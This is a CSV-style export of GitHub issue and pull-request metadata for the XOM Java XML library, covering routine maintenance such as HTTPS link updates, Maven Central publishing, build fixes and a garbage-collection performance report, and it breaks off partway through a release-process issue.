elharo,xom,https://api.github.com/repos/elharo/xom/issues/129,556858096,MDExOlB1bGxSZXF1ZXN0MzY4NTUzMjcw,129,clean up website directories,1005544,closed,FALSE,NA,NA,0,2020-01-29T13:21:21Z,2020-01-29T13:36:28Z,2020-01-29T13:36:23Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/129/labels{/name},https://api.github.com/repos/elharo/xom/issues/129/comments,https://api.github.com/repos/elharo/xom/issues/129/events,https://github.com/elharo/xom/pull/129,https://api.github.com/repos/elharo/xom/pulls/129
elharo,xom,https://api.github.com/repos/elharo/xom/issues/128,556856131,MDExOlB1bGxSZXF1ZXN0MzY4NTUxNTk5,128,More https,1005544,closed,FALSE,NA,NA,0,2020-01-29T13:17:45Z,2020-04-28T11:05:39Z,2020-01-29T13:21:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/128/labels{/name},https://api.github.com/repos/elharo/xom/issues/128/comments,https://api.github.com/repos/elharo/xom/issues/128/events,https://github.com/elharo/xom/pull/128,https://api.github.com/repos/elharo/xom/pulls/128
elharo,xom,https://api.github.com/repos/elharo/xom/issues/127,555725973,MDExOlB1bGxSZXF1ZXN0MzY3NjE1OTM2,127,Add Automatic-Module-Name,1005544,closed,FALSE,NA,NA,0,2020-01-27T17:34:34Z,2020-01-29T13:37:36Z,2020-01-29T13:37:32Z,OWNER,NA,fixes #112,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/127/labels{/name},https://api.github.com/repos/elharo/xom/issues/127/comments,https://api.github.com/repos/elharo/xom/issues/127/events,https://github.com/elharo/xom/pull/127,https://api.github.com/repos/elharo/xom/pulls/127
elharo,xom,https://api.github.com/repos/elharo/xom/issues/126,555723163,MDExOlB1bGxSZXF1ZXN0MzY3NjEzNzA5,126,detab,1005544,closed,FALSE,NA,NA,0,2020-01-27T17:29:10Z,2020-01-27T17:31:14Z,2020-01-27T17:31:10Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/126/labels{/name},https://api.github.com/repos/elharo/xom/issues/126/comments,https://api.github.com/repos/elharo/xom/issues/126/events,https://github.com/elharo/xom/pull/126,https://api.github.com/repos/elharo/xom/pulls/126
elharo,xom,https://api.github.com/repos/elharo/xom/issues/125,555638860,MDExOlB1bGxSZXF1ZXN0MzY3NTQ0MzQ1,125,path to bundle.jar,1005544,closed,FALSE,NA,NA,0,2020-01-27T15:10:34Z,2020-01-27T15:21:56Z,2020-01-27T15:21:51Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/125/labels{/name},https://api.github.com/repos/elharo/xom/issues/125/comments,https://api.github.com/repos/elharo/xom/issues/125/events,https://github.com/elharo/xom/pull/125,https://api.github.com/repos/elharo/xom/pulls/125
elharo,xom,https://api.github.com/repos/elharo/xom/issues/124,555292663,MDExOlB1bGxSZXF1ZXN0MzY3MjY0ODI0,124,update sample for Java 1.5,1005544,closed,FALSE,NA,NA,0,2020-01-26T21:46:02Z,2020-01-26T23:35:05Z,2020-01-26T23:35:02Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/124/labels{/name},https://api.github.com/repos/elharo/xom/issues/124/comments,https://api.github.com/repos/elharo/xom/issues/124/events,https://github.com/elharo/xom/pull/124,https://api.github.com/repos/elharo/xom/pulls/124
elharo,xom,https://api.github.com/repos/elharo/xom/issues/123,555275168,MDExOlB1bGxSZXF1ZXN0MzY3MjUyMTYw,123,Update README.md with the new version number.,1005544,closed,FALSE,NA,NA,0,2020-01-26T19:25:51Z,2020-01-26T21:41:01Z,2020-01-26T21:40:58Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/123/labels{/name},https://api.github.com/repos/elharo/xom/issues/123/comments,https://api.github.com/repos/elharo/xom/issues/123/events,https://github.com/elharo/xom/pull/123,https://api.github.com/repos/elharo/xom/pulls/123
elharo,xom,https://api.github.com/repos/elharo/xom/issues/122,555271921,MDU6SXNzdWU1NTUyNzE5MjE=,122,CircleCI does not fail the build when the tests fail,1005544,closed,FALSE,NA,NA,1,2020-01-26T19:01:41Z,2020-02-02T16:32:15Z,2020-02-02T16:32:15Z,OWNER,NA,"test:
    [junit] Test nu.xom.tests.InfoTest FAILED
    [junit] Test nu.xom.tests.XSLTransformTest FAILED",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/122/labels{/name},https://api.github.com/repos/elharo/xom/issues/122/comments,https://api.github.com/repos/elharo/xom/issues/122/events,https://github.com/elharo/xom/issues/122,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/121,555271709,MDExOlB1bGxSZXF1ZXN0MzY3MjQ5NTg0,121,use https for XOM URL,1005544,closed,FALSE,NA,NA,0,2020-01-26T19:00:05Z,2020-01-26T19:22:54Z,2020-01-26T19:22:51Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/121/labels{/name},https://api.github.com/repos/elharo/xom/issues/121/comments,https://api.github.com/repos/elharo/xom/issues/121/events,https://github.com/elharo/xom/pull/121,https://api.github.com/repos/elharo/xom/pulls/121
elharo,xom,https://api.github.com/repos/elharo/xom/issues/120,555225206,MDU6SXNzdWU1NTUyMjUyMDY=,120,Convert as many http links to https as possible ,1005544,open,FALSE,NA,NA,0,2020-01-26T13:01:11Z,2020-01-26T13:01:11Z,NA,OWNER,NA,in website and docs,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/120/labels{/name},https://api.github.com/repos/elharo/xom/issues/120/comments,https://api.github.com/repos/elharo/xom/issues/120/events,https://github.com/elharo/xom/issues/120,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/119,555225115,MDExOlB1bGxSZXF1ZXN0MzY3MjE1MTMy,119,add FAQ and tutorial links,1005544,closed,FALSE,NA,NA,0,2020-01-26T13:00:15Z,2020-01-26T13:01:30Z,2020-01-26T13:01:27Z,OWNER,NA,fixes #86,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/119/labels{/name},https://api.github.com/repos/elharo/xom/issues/119/comments,https://api.github.com/repos/elharo/xom/issues/119/events,https://github.com/elharo/xom/pull/119,https://api.github.com/repos/elharo/xom/pulls/119
elharo,xom,https://api.github.com/repos/elharo/xom/issues/118,555219488,MDExOlB1bGxSZXF1ZXN0MzY3MjExMjE2,118,Update for 1.3.3 release,1005544,closed,FALSE,NA,NA,0,2020-01-26T12:11:09Z,2020-01-26T12:55:06Z,2020-01-26T12:55:00Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/118/labels{/name},https://api.github.com/repos/elharo/xom/issues/118/comments,https://api.github.com/repos/elharo/xom/issues/118/events,https://github.com/elharo/xom/pull/118,https://api.github.com/repos/elharo/xom/pulls/118
elharo,xom,https://api.github.com/repos/elharo/xom/issues/117,555089156,MDExOlB1bGxSZXF1ZXN0MzY3MTIwMjEy,117,Xalan 2.7.2,1005544,closed,FALSE,NA,NA,0,2020-01-25T14:03:22Z,2020-01-25T14:11:35Z,2020-01-25T14:11:33Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/117/labels{/name},https://api.github.com/repos/elharo/xom/issues/117/comments,https://api.github.com/repos/elharo/xom/issues/117/events,https://github.com/elharo/xom/pull/117,https://api.github.com/repos/elharo/xom/pulls/117
elharo,xom,https://api.github.com/repos/elharo/xom/issues/116,554972705,MDExOlB1bGxSZXF1ZXN0MzY3MDMxMjM3,116,delete irrelevant boilerplate,1005544,closed,FALSE,NA,NA,0,2020-01-24T21:54:55Z,2020-01-25T14:01:50Z,2020-01-25T14:01:47Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/116/labels{/name},https://api.github.com/repos/elharo/xom/issues/116/comments,https://api.github.com/repos/elharo/xom/issues/116/events,https://github.com/elharo/xom/pull/116,https://api.github.com/repos/elharo/xom/pulls/116
elharo,xom,https://api.github.com/repos/elharo/xom/issues/115,554959257,MDExOlB1bGxSZXF1ZXN0MzY3MDIwMjk1,115,Don't garbage collect at end of document,1005544,closed,FALSE,NA,NA,0,2020-01-24T21:19:58Z,2020-01-24T21:39:42Z,2020-01-24T21:39:38Z,OWNER,NA,fixes #113,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/115/labels{/name},https://api.github.com/repos/elharo/xom/issues/115/comments,https://api.github.com/repos/elharo/xom/issues/115/events,https://github.com/elharo/xom/pull/115,https://api.github.com/repos/elharo/xom/pulls/115
elharo,xom,https://api.github.com/repos/elharo/xom/issues/114,554958386,MDExOlB1bGxSZXF1ZXN0MzY3MDE5NTY3,114,1.3.3-SNAPSHOT,1005544,closed,FALSE,NA,NA,0,2020-01-24T21:17:41Z,2020-04-28T11:05:36Z,2020-01-24T21:39:52Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/114/labels{/name},https://api.github.com/repos/elharo/xom/issues/114/comments,https://api.github.com/repos/elharo/xom/issues/114/events,https://github.com/elharo/xom/pull/114,https://api.github.com/repos/elharo/xom/pulls/114
elharo,xom,https://api.github.com/repos/elharo/xom/issues/113,509802985,MDU6SXNzdWU1MDk4MDI5ODU=,113,"Everytime a document is built, freememory calls System.gc()",56728433,closed,FALSE,NA,NA,7,2019-10-21T08:14:41Z,2020-01-27T16:15:07Z,2020-01-24T21:39:38Z,NONE,NA,"Since commit [encoding test needs more memory](https://github.com/elharo/xom/commit/ad5cb71a0bd72ecc40a01c156c80ebea7313c647), _nu.xom.XOMHandler#freeMemory_ performs an explicit _System.gc()_ calls.

It can lead to a very huge performance penalty. I don't understand the need here. It seems to be a mistake left there after leading some tests. Could you confirm ?",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/113/labels{/name},https://api.github.com/repos/elharo/xom/issues/113/comments,https://api.github.com/repos/elharo/xom/issues/113/events,https://github.com/elharo/xom/issues/113,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/112,479300861,MDU6SXNzdWU0NzkzMDA4NjE=,112,Add Automatic-Module-Name header to jar manifest,1005544,closed,FALSE,NA,NA,0,2019-08-10T19:52:13Z,2020-01-29T13:37:32Z,2020-01-29T13:37:32Z,OWNER,NA,https://github.com/GoogleCloudPlatform/cloud-opensource-java/blob/master/library-best-practices/JLBP-20.md,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/112/labels{/name},https://api.github.com/repos/elharo/xom/issues/112/comments,https://api.github.com/repos/elharo/xom/issues/112/events,https://github.com/elharo/xom/issues/112,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/111,433027491,MDExOlB1bGxSZXF1ZXN0MjcwMzIzMjg1,111,To update the website,1005544,closed,FALSE,NA,NA,0,2019-04-14T20:07:21Z,2019-04-14T20:35:46Z,2019-04-14T20:35:43Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/111/labels{/name},https://api.github.com/repos/elharo/xom/issues/111/comments,https://api.github.com/repos/elharo/xom/issues/111/events,https://github.com/elharo/xom/pull/111,https://api.github.com/repos/elharo/xom/pulls/111
elharo,xom,https://api.github.com/repos/elharo/xom/issues/110,433024854,MDExOlB1bGxSZXF1ZXN0MjcwMzIxOTA3,110,Website,1005544,closed,FALSE,NA,NA,0,2019-04-14T19:47:08Z,2019-04-14T20:05:27Z,2019-04-14T20:05:21Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/110/labels{/name},https://api.github.com/repos/elharo/xom/issues/110/comments,https://api.github.com/repos/elharo/xom/issues/110/events,https://github.com/elharo/xom/pull/110,https://api.github.com/repos/elharo/xom/pulls/110
elharo,xom,https://api.github.com/repos/elharo/xom/issues/109,427395102,MDExOlB1bGxSZXF1ZXN0MjY2MDEyODAz,109,new README for github,1005544,closed,FALSE,NA,NA,0,2019-03-31T13:10:08Z,2019-03-31T13:49:54Z,2019-03-31T13:49:50Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/109/labels{/name},https://api.github.com/repos/elharo/xom/issues/109/comments,https://api.github.com/repos/elharo/xom/issues/109/events,https://github.com/elharo/xom/pull/109,https://api.github.com/repos/elharo/xom/pulls/109
elharo,xom,https://api.github.com/repos/elharo/xom/issues/108,427325220,MDExOlB1bGxSZXF1ZXN0MjY1OTY2NDQx,108,Version 1.3.2,1005544,closed,FALSE,NA,NA,0,2019-03-30T20:32:16Z,2019-03-30T21:12:10Z,2019-03-30T21:12:07Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/108/labels{/name},https://api.github.com/repos/elharo/xom/issues/108/comments,https://api.github.com/repos/elharo/xom/issues/108/events,https://github.com/elharo/xom/pull/108,https://api.github.com/repos/elharo/xom/pulls/108
elharo,xom,https://api.github.com/repos/elharo/xom/issues/107,427321094,MDExOlB1bGxSZXF1ZXN0MjY1OTYzODU2,107,don't filter the jar file,1005544,closed,FALSE,NA,NA,0,2019-03-30T19:46:36Z,2019-03-30T19:46:53Z,2019-03-30T19:46:49Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/107/labels{/name},https://api.github.com/repos/elharo/xom/issues/107/comments,https://api.github.com/repos/elharo/xom/issues/107/events,https://github.com/elharo/xom/pull/107,https://api.github.com/repos/elharo/xom/pulls/107
elharo,xom,https://api.github.com/repos/elharo/xom/issues/106,420966988,MDU6SXNzdWU0MjA5NjY5ODg=,106,Prolog control,3372924,closed,FALSE,NA,NA,1,2019-03-14T11:31:23Z,2019-03-31T13:52:43Z,2019-03-31T13:52:43Z,NONE,NA,Consider adding the ability to control whether a prolog is added and what that prolog contains. I process XML using Xalan callouts from XSLT into the Java tier. I have functions which iterate and generate XML using BaseX. Each loop would generate an XML which is concatenated into a output string. I only need the prolog on the first and not each iteration. I created an overload to handle this. This product was great to get away from the extremely slow Java built into DOM processing. Excellent workl,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/106/labels{/name},https://api.github.com/repos/elharo/xom/issues/106/comments,https://api.github.com/repos/elharo/xom/issues/106/events,https://github.com/elharo/xom/issues/106,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/105,414311965,MDU6SXNzdWU0MTQzMTE5NjU=,105,Invalid artifact 1.3.0 in the Maven Central,13061803,closed,FALSE,NA,NA,1,2019-02-25T21:19:41Z,2019-02-25T21:47:38Z,2019-02-25T21:47:38Z,NONE,NA,"Invalid artifact: 1.3.0 in the Maven Central. 
Downloaded jar file has the wrong content. It has no packages with class files inside. Instead, it contains different jars (with classes, sources, javadocs).",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/105/labels{/name},https://api.github.com/repos/elharo/xom/issues/105/comments,https://api.github.com/repos/elharo/xom/issues/105/events,https://github.com/elharo/xom/issues/105,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/104,413761211,MDExOlB1bGxSZXF1ZXN0MjU1NjQ5ODU5,104,xom:xom:1.3.1,1005544,closed,FALSE,NA,NA,0,2019-02-24T00:22:11Z,2020-04-28T11:05:32Z,2019-02-24T00:22:18Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/104/labels{/name},https://api.github.com/repos/elharo/xom/issues/104/comments,https://api.github.com/repos/elharo/xom/issues/104/events,https://github.com/elharo/xom/pull/104,https://api.github.com/repos/elharo/xom/pulls/104
elharo,xom,https://api.github.com/repos/elharo/xom/issues/103,411682740,MDExOlB1bGxSZXF1ZXN0MjU0MDcwNzU5,103,trivial javadoc fix,1005544,closed,FALSE,NA,NA,0,2019-02-18T23:25:08Z,2019-02-18T23:49:18Z,2019-02-18T23:49:15Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/103/labels{/name},https://api.github.com/repos/elharo/xom/issues/103/comments,https://api.github.com/repos/elharo/xom/issues/103/events,https://github.com/elharo/xom/pull/103,https://api.github.com/repos/elharo/xom/pulls/103
elharo,xom,https://api.github.com/repos/elharo/xom/issues/102,411682278,MDExOlB1bGxSZXF1ZXN0MjU0MDcwNDAw,102,Maven release instructions and fixes,1005544,closed,FALSE,NA,NA,0,2019-02-18T23:22:47Z,2020-04-28T11:05:29Z,2019-02-18T23:49:04Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/102/labels{/name},https://api.github.com/repos/elharo/xom/issues/102/comments,https://api.github.com/repos/elharo/xom/issues/102/events,https://github.com/elharo/xom/pull/102,https://api.github.com/repos/elharo/xom/pulls/102
elharo,xom,https://api.github.com/repos/elharo/xom/issues/101,409367389,MDU6SXNzdWU0MDkzNjczODk=,101,What are the official dependency coordinates for XOM?,106582,closed,FALSE,NA,NA,3,2019-02-12T15:49:19Z,2019-02-12T16:04:35Z,2019-02-12T15:53:38Z,NONE,NA,"Let's say I'm writing a non-toy project, and want to consume XOM.  I'm using Ant+Ivy, Maven, Gradle, SBT,  etc. ...  What coordinates do I use to import XOM?

Those build tools declare external dependencies using coordinates.  Manually dropping an external JAR into source control is not easily supported by most build tools and would be frowned upon by most consuming projects.

**If** a goal is to make the project consumable, it needs to be in a Maven repo.  I want to stress that this doesn't mean consumers must use ""Maven the build tool"" when consuming the JAR from a ""Maven-layout repository"".

Maven Central and Bintray JCenter are the 2 most popular repositories.


XOM is great and I'd like to use it but I can't because of the current lack of standard publishing practices.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/101/labels{/name},https://api.github.com/repos/elharo/xom/issues/101/comments,https://api.github.com/repos/elharo/xom/issues/101/events,https://github.com/elharo/xom/issues/101,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/100,401429692,MDU6SXNzdWU0MDE0Mjk2OTI=,100,Consider adding Path variants to methods that currently take Files,1005544,open,FALSE,NA,NA,0,2019-01-21T16:32:50Z,2019-01-21T16:32:50Z,NA,OWNER,NA,"E.g. in Builder et al.

This requires java 1.7 as a minimum version. ",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/100/labels{/name},https://api.github.com/repos/elharo/xom/issues/100/comments,https://api.github.com/repos/elharo/xom/issues/100/events,https://github.com/elharo/xom/issues/100,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/99,395116780,MDExOlB1bGxSZXF1ZXN0MjQxNjUzNzIx,99,update build,1005544,closed,FALSE,NA,NA,0,2019-01-01T22:25:02Z,2019-01-02T12:44:26Z,2019-01-02T12:44:23Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/99/labels{/name},https://api.github.com/repos/elharo/xom/issues/99/comments,https://api.github.com/repos/elharo/xom/issues/99/events,https://github.com/elharo/xom/pull/99,https://api.github.com/repos/elharo/xom/pulls/99
elharo,xom,https://api.github.com/repos/elharo/xom/issues/98,395111540,MDExOlB1bGxSZXF1ZXN0MjQxNjUwNTg3,98,fix warnings,1005544,closed,FALSE,NA,NA,0,2019-01-01T20:58:27Z,2019-01-01T22:07:52Z,2019-01-01T22:07:49Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/98/labels{/name},https://api.github.com/repos/elharo/xom/issues/98/comments,https://api.github.com/repos/elharo/xom/issues/98/events,https://github.com/elharo/xom/pull/98,https://api.github.com/repos/elharo/xom/pulls/98
elharo,xom,https://api.github.com/repos/elharo/xom/issues/97,395101736,MDExOlB1bGxSZXF1ZXN0MjQxNjQ0ODY2,97,add some generics,1005544,closed,FALSE,NA,NA,0,2019-01-01T18:05:01Z,2019-01-01T20:09:20Z,2019-01-01T20:09:17Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/97/labels{/name},https://api.github.com/repos/elharo/xom/issues/97/comments,https://api.github.com/repos/elharo/xom/issues/97/events,https://github.com/elharo/xom/pull/97,https://api.github.com/repos/elharo/xom/pulls/97
elharo,xom,https://api.github.com/repos/elharo/xom/issues/96,395098666,MDExOlB1bGxSZXF1ZXN0MjQxNjQyOTY4,96,1.3.1-SNAPSHOT,1005544,closed,FALSE,NA,NA,0,2019-01-01T17:13:14Z,2019-01-01T18:46:00Z,2019-01-01T18:45:57Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/96/labels{/name},https://api.github.com/repos/elharo/xom/issues/96/comments,https://api.github.com/repos/elharo/xom/issues/96/events,https://github.com/elharo/xom/pull/96,https://api.github.com/repos/elharo/xom/pulls/96
elharo,xom,https://api.github.com/repos/elharo/xom/issues/95,395036331,MDExOlB1bGxSZXF1ZXN0MjQxNjA0NDU5,95,update links,1005544,closed,FALSE,NA,NA,0,2018-12-31T22:04:42Z,2019-01-01T12:57:15Z,2019-01-01T12:57:11Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/95/labels{/name},https://api.github.com/repos/elharo/xom/issues/95/comments,https://api.github.com/repos/elharo/xom/issues/95/events,https://github.com/elharo/xom/pull/95,https://api.github.com/repos/elharo/xom/pulls/95
elharo,xom,https://api.github.com/repos/elharo/xom/issues/94,395033041,MDExOlB1bGxSZXF1ZXN0MjQxNjAyMTE4,94,update versions,1005544,closed,FALSE,NA,NA,0,2018-12-31T21:21:55Z,2018-12-31T22:22:17Z,2018-12-31T22:22:14Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/94/labels{/name},https://api.github.com/repos/elharo/xom/issues/94/comments,https://api.github.com/repos/elharo/xom/issues/94/events,https://github.com/elharo/xom/pull/94,https://api.github.com/repos/elharo/xom/pulls/94
elharo,xom,https://api.github.com/repos/elharo/xom/issues/93,395031323,MDU6SXNzdWUzOTUwMzEzMjM=,93,http://www.xom.nu,1005544,open,FALSE,NA,NA,0,2018-12-31T21:00:58Z,2018-12-31T21:00:58Z,NA,OWNER,NA,Make sure www.xom.nu works or redirects to xom.nu and update internal links. ,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/93/labels{/name},https://api.github.com/repos/elharo/xom/issues/93/comments,https://api.github.com/repos/elharo/xom/issues/93/events,https://github.com/elharo/xom/issues/93,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/92,395015712,MDExOlB1bGxSZXF1ZXN0MjQxNTg5NDAx,92,release 1.3.0,1005544,closed,FALSE,NA,NA,0,2018-12-31T18:17:46Z,2020-04-28T11:05:28Z,2018-12-31T20:13:54Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/92/labels{/name},https://api.github.com/repos/elharo/xom/issues/92/comments,https://api.github.com/repos/elharo/xom/issues/92/events,https://github.com/elharo/xom/pull/92,https://api.github.com/repos/elharo/xom/pulls/92
elharo,xom,https://api.github.com/repos/elharo/xom/issues/91,394993389,MDU6SXNzdWUzOTQ5OTMzODk=,91,XSLTransform.toDocument should allow whitespace only text nodes,1005544,closed,FALSE,NA,NA,1,2018-12-31T15:12:37Z,2020-02-08T19:43:36Z,2020-02-08T19:43:36Z,OWNER,NA,"  The result of a transformation is a XOM <classname>Nodes</classname> object.
  The <classname>Nodes</classname> list returned by the <methodname>transform</methodname> method
  may contain zero, one, or more than one node, depending on what the stylesheet
  produced. After all, there&rsquo;s no guarantee that an XSL transformation produces a well-formed XML document.
  Sometimes it only produces a well-balanced document fragment, and sometimes it produces nothing at all.
  However, many stylesheets do produce well-formed XML documents.
   <classname>XSLTransform</classname> includes a static <methodname>toDocument</methodname>
   utility method that converts a <classname>Nodes</classname> object into a <classname>Document</classname> object.
    However, if the <classname>Nodes</classname> passed to this method contains no elements, more than one element, or any <classname>Text</classname>
  objects, then <methodname>toDocument</methodname> throws an <exceptionname>XMLException</exceptionname>.
   For example,",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/91/labels{/name},https://api.github.com/repos/elharo/xom/issues/91/comments,https://api.github.com/repos/elharo/xom/issues/91/events,https://github.com/elharo/xom/issues/91,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/90,367963358,MDU6SXNzdWUzNjc5NjMzNTg=,90,Update the xom entry in Maven Central,16505107,closed,FALSE,NA,NA,7,2018-10-08T21:43:04Z,2019-03-30T22:07:53Z,2019-03-30T22:07:52Z,NONE,NA,"The Xom artifact in maven central is from [2010(1.2.5)](https://search.maven.org/artifact/xom/xom/1.2.5/jar) while the current version is 1.2.11.
Please update the version in the maven central.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/90/labels{/name},https://api.github.com/repos/elharo/xom/issues/90/comments,https://api.github.com/repos/elharo/xom/issues/90/events,https://github.com/elharo/xom/issues/90,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/89,352973426,MDU6SXNzdWUzNTI5NzM0MjY=,89,Inlcude line and column number in ParsingException message if available,1005544,open,FALSE,NA,NA,0,2018-08-22T14:15:28Z,2018-08-22T14:15:34Z,NA,OWNER,NA,"That is, change ""The content of elements must consist of well-formed character data or markup.""
to ""The content of elements must consist of well-formed character data or markup"" at line 32, column 76"" or some such. ",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/89/labels{/name},https://api.github.com/repos/elharo/xom/issues/89/comments,https://api.github.com/repos/elharo/xom/issues/89/events,https://github.com/elharo/xom/issues/89,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/88,345724092,MDExOlB1bGxSZXF1ZXN0MjA0Nzc4NDQ3,88,support enhanced for loops,1005544,closed,FALSE,NA,NA,0,2018-07-30T11:48:07Z,2018-12-31T16:51:15Z,2018-12-31T16:51:12Z,OWNER,NA,Biggest open question is whether `Node` should be directly Iterable or not. ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/88/labels{/name},https://api.github.com/repos/elharo/xom/issues/88/comments,https://api.github.com/repos/elharo/xom/issues/88/events,https://github.com/elharo/xom/pull/88,https://api.github.com/repos/elharo/xom/pulls/88
elharo,xom,https://api.github.com/repos/elharo/xom/issues/87,345570700,MDExOlB1bGxSZXF1ZXN0MjA0NjY2NDMz,87,Covariant copy method,1005544,closed,FALSE,NA,NA,0,2018-07-29T23:05:26Z,2018-07-30T01:30:53Z,2018-07-30T01:30:49Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/87/labels{/name},https://api.github.com/repos/elharo/xom/issues/87/comments,https://api.github.com/repos/elharo/xom/issues/87/events,https://github.com/elharo/xom/pull/87,https://api.github.com/repos/elharo/xom/pulls/87
elharo,xom,https://api.github.com/repos/elharo/xom/issues/86,345570550,MDU6SXNzdWUzNDU1NzA1NTA=,86,Add FAQ and tutorial to top list on home page,1005544,closed,FALSE,NA,NA,0,2018-07-29T23:03:08Z,2020-01-26T13:01:27Z,2020-01-26T13:01:27Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/86/labels{/name},https://api.github.com/repos/elharo/xom/issues/86/comments,https://api.github.com/repos/elharo/xom/issues/86/events,https://github.com/elharo/xom/issues/86,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/85,345558274,MDExOlB1bGxSZXF1ZXN0MjA0NjU4NzAz,85,Maven1,1005544,closed,FALSE,NA,NA,0,2018-07-29T19:58:31Z,2018-07-29T22:15:55Z,2018-07-29T22:15:51Z,OWNER,NA,fix #81 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/85/labels{/name},https://api.github.com/repos/elharo/xom/issues/85/comments,https://api.github.com/repos/elharo/xom/issues/85/events,https://github.com/elharo/xom/pull/85,https://api.github.com/repos/elharo/xom/pulls/85
elharo,xom,https://api.github.com/repos/elharo/xom/issues/84,345555879,MDExOlB1bGxSZXF1ZXN0MjA0NjU3MzQy,84,1.3.0 SNAPSHOT,1005544,closed,FALSE,NA,NA,0,2018-07-29T19:25:57Z,2018-07-29T19:52:50Z,2018-07-29T19:52:47Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/84/labels{/name},https://api.github.com/repos/elharo/xom/issues/84/comments,https://api.github.com/repos/elharo/xom/issues/84/events,https://github.com/elharo/xom/pull/84,https://api.github.com/repos/elharo/xom/pulls/84
elharo,xom,https://api.github.com/repos/elharo/xom/issues/83,345456732,MDU6SXNzdWUzNDU0NTY3MzI=,83,Document release process,1005544,closed,FALSE,NA,NA,0,2018-07-28T15:27:32Z,2020-01-26T12:41:01Z,2020-01-26T12:41:01Z,OWNER,NA,"1. Update release notes and docs.
2. Remove SNAPSHOT from build.xml
